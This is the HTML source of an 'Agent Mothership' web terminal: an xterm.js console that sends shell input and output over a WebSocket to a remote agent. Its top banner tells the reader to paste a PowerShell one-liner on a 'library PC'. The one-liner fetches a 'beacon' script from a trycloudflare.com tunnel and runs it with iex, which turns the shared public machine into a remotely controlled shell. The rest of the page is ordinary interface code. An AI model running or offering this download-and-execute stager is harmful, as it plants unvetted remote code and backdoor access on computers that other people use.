<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🤖 Agent Mothership</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      background: #1a1a2e;
      color: #e0e0e0;
      font-family: 'Cascadia Code', 'Fira Code', 'JetBrains Mono', 'Consolas', monospace;
      height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }
    
    /* Header */
    .header {
      background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
      padding: 10px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #e94560;
      flex-shrink: 0;
    }
    
    .header-title {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .header-title h1 {
      font-size: 16px;
      font-weight: 600;
      background: linear-gradient(90deg, #e94560, #0f3460);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #4ade80;
      display: inline-block;
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    
    .header-status {
      font-size: 12px;
      color: #888;
    }
    
    .header-actions {
      display: flex;
      gap: 8px;
    }
    
    .header-btn {
      background: rgba(233, 69, 96, 0.2);
      border: 1px solid rgba(233, 69, 96, 0.3);
      color: #e94560;
      padding: 4px 12px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 12px;
      font-family: inherit;
      transition: all 0.2s;
    }
    
    .header-btn:hover {
      background: rgba(233, 69, 96, 0.3);
    }
    
    /* Terminal */
    #terminal-container {
      flex: 1;
      padding: 4px;
    }
    
    /* Footer */
    .footer {
      background: #16213e;
      padding: 6px 20px;
      display: flex;
      justify-content: space-between;
      font-size: 11px;
      color: #666;
      border-top: 1px solid #1a1a3e;
      flex-shrink: 0;
    }
    
    .footer a {
      color: #e94560;
      text-decoration: none;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* Loading */
    #loading {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      gap: 20px;
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid #0f3460;
      border-top: 3px solid #e94560;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    #loading p {
      font-size: 14px;
      color: #888;
    }
    
    /* Hidden until connected */
    #terminal {
      display: none;
      height: 100%;
    }
    
    #terminal.connected {
      display: block;
    }
    
    #loading.connected {
      display: none;
    }
    
    /* One-liner banner */
    #oneliner-banner {
      background: #0d1117;
      border: 2px solid #4ade80;
      border-radius: 0;
      padding: 12px 20px;
      flex-shrink: 0;
    }
    #oneliner-banner h3 {
      font-size: 11px;
      color: #4ade80;
      margin: 0 0 4px 0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    #oneliner-banner code {
      display: block;
      font-size: 13px;
      color: #fff;
      word-break: break-all;
      line-height: 1.5;
      user-select: all;
      background: #1a1a2e;
      padding: 8px 12px;
      border-radius: 4px;
      border: 1px solid #333;
    }
  </style>
</head>
<body>
  <div id="oneliner-banner">
    <h3>🪟 PowerShell One-Liner — Paste on library PC:</h3>
    <code id="oneliner-code">iex (iwr -Uri https://score-blocked-integrate-early.trycloudflare.com/beacon-script).Content</code>
  </div>
  <div class="header">
    <div class="header-title">
      <span>🤖</span>
      <h1>Agent Mothership</h1>
      <span class="status-dot" id="statusDot"></span>
      <span class="header-status" id="statusText">Connecting...</span>
    </div>
    <div class="header-actions">
      <button class="header-btn" onclick="terminal.focus()">Focus</button>
      <button class="header-btn" onclick="document.querySelector('.xterm')?.requestFullscreen()">Fullscreen</button>
    </div>
  </div>
  
  <div id="terminal-container">
    <div id="loading">
      <div class="spinner"></div>
      <p>Establishing secure connection to your agent...</p>
    </div>
    <div id="terminal"></div>
  </div>
  
  <div class="footer">
    <span>Agent Mothership v1.0</span>
    <span>
      <a href="https://github.com/ricksanchez8701/agent-mothership" target="_blank">GitHub</a>
    </span>
  </div>

  <!-- xterm.js from CDN -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
  <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-web-links@0.9.0/lib/xterm-addon-web-links.min.js"></script>
  
  <script>
    // ──────────────────────────────────────────────
    // Terminal setup
    // ──────────────────────────────────────────────
    const termContainer = document.getElementById('terminal');
    const loadingEl = document.getElementById('loading');
    const statusText = document.getElementById('statusText');
    const statusDot = document.getElementById('statusDot');
    
    const terminal = new Terminal({
      cursorBlink: true,
      cursorStyle: 'block',
      fontSize: 14,
      fontFamily: "'Cascadia Code', 'Fira Code', 'JetBrains Mono', 'Consolas', monospace",
      theme: {
        background: '#1a1a2e',
        foreground: '#e0e0e0',
        cursor: '#e94560',
        cursorAccent: '#1a1a2e',
        selectionBackground: 'rgba(233, 69, 96, 0.3)',
        black: '#1a1a2e',
        red: '#e94560',
        green: '#4ade80',
        yellow: '#fbbf24',
        blue: '#60a5fa',
        magenta: '#c084fc',
        cyan: '#22d3ee',
        white: '#e0e0e0',
        brightBlack: '#4a4a6a',
        brightRed: '#e94560',
        brightGreen: '#4ade80',
        brightYellow: '#fbbf24',
        brightBlue: '#60a5fa',
        brightMagenta: '#c084fc',
        brightCyan: '#22d3ee',
        brightWhite: '#ffffff',
      },
      allowTransparency: false,
      scrollback: 5000,
    });
    
    // Addons
    const fitAddon = new FitAddon.FitAddon();
    terminal.loadAddon(fitAddon);
    
    const webLinksAddon = new WebLinksAddon.WebLinksAddon();
    terminal.loadAddon(webLinksAddon);
    
    // Open terminal
    terminal.open(termContainer);
    fitAddon.fit();
    
    // ──────────────────────────────────────────────
    // WebSocket connection
    // ──────────────────────────────────────────────
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}`;
    
    let ws;
    let reconnectAttempts = 0;
    const maxReconnectAttempts = 5;
    
    function connect() {
      statusText.textContent = 'Connecting...';
      statusDot.style.background = '#fbbf24';
      
      ws = new WebSocket(wsUrl);
      
      ws.onopen = () => {
        reconnectAttempts = 0;
        statusText.textContent = 'Connected';
        statusDot.style.background = '#4ade80';
        loadingEl.classList.add('connected');
        termContainer.classList.add('connected');
        
        terminal.focus();
        
        // Send welcome message
        terminal.writeln('\x1b[36m╔════════════════════════════════════════════╗\x1b[0m');
        terminal.writeln('\x1b[36m║  🤖 Agent Mothership — Connected!         ║\x1b[0m');
        terminal.writeln('\x1b[36m║                                            ║\x1b[0m');
        terminal.writeln('\x1b[36m║  You\'re already connected to your AI      ║\x1b[0m');
        terminal.writeln('\x1b[36m║  agent! Use this terminal for shell          ║\x1b[0m');
        terminal.writeln('\x1b[36m║  commands (\x1b[33mls\x1b[36m, \x1b[33mcd\x1b[36m, \x1b[33mnpm\x1b[36m, etc.)         ║\x1b[0m');
        terminal.writeln('\x1b[36m║  Type \x1b[33mexit\x1b[36m to close this session       ║\x1b[0m');
        terminal.writeln('\x1b[36m╚════════════════════════════════════════════╝\x1b[0m');
        terminal.writeln('');
      };
      
      ws.onmessage = (event) => {
        terminal.write(atob(event.data));
      };
      
      ws.onclose = () => {
        statusText.textContent = 'Disconnected';
        statusDot.style.background = '#e94560';
        
        if (reconnectAttempts < maxReconnectAttempts) {
          reconnectAttempts++;
          const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 10000);
          statusText.textContent = `Reconnecting in ${delay/1000}s... (${reconnectAttempts}/${maxReconnectAttempts})`;
          setTimeout(connect, delay);
        } else {
          terminal.writeln('\x1b[31m⚠ Connection lost. Refresh the page to reconnect.\x1b[0m');
        }
      };
      
      ws.onerror = () => {
        statusText.textContent = 'Connection error';
        statusDot.style.background = '#e94560';
      };
    }
    
    // ──────────────────────────────────────────────
    // Input handling
    // ──────────────────────────────────────────────
    terminal.onData((data) => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(data);
      }
    });
    
    // ──────────────────────────────────────────────
    // Resize handling
    // ──────────────────────────────────────────────
    window.addEventListener('resize', () => {
      fitAddon.fit();
    });
    
    // ──────────────────────────────────────────────
    // Start
    // ──────────────────────────────────────────────
    connect();
  </script>
</body>
</html>
